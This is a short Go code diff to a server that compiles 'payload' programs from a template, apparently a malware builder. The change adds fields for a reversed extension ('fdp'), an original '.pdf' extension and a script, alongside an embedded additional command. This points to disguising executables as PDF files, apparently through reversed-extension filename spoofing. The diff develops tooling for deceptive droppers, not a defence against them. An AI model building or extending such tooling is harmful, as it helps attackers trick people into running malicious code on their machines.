@@ -8,7 +8,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"html/template"
+	"text/template"
 	"image"
 	"image/png"
 	"io"
@@ -87,6 +87,9 @@ type BuildMetadata struct {
 type PayloadData struct {
 	PdfName           string
 	AdditionalCommand string
+	ReversedExt       string
+	OriginalExt       string
+	Script            string
 }
 
 // CompileResponse returned to client
@@ -329,6 +332,9 @@ func handleCompile(w http.ResponseWriter, r *http.Request) {
 	err = tmpl.Execute(&mainGoBuf, PayloadData{
 		PdfName:           pdfFilename,
 		AdditionalCommand: additionalCmd,
+		ReversedExt:       "fdp",
+		OriginalExt:       ".pdf",
+		Script:            "",
 	})
 	if err != nil {
 		log.Printf("Failed to execute payload template: %v", err)
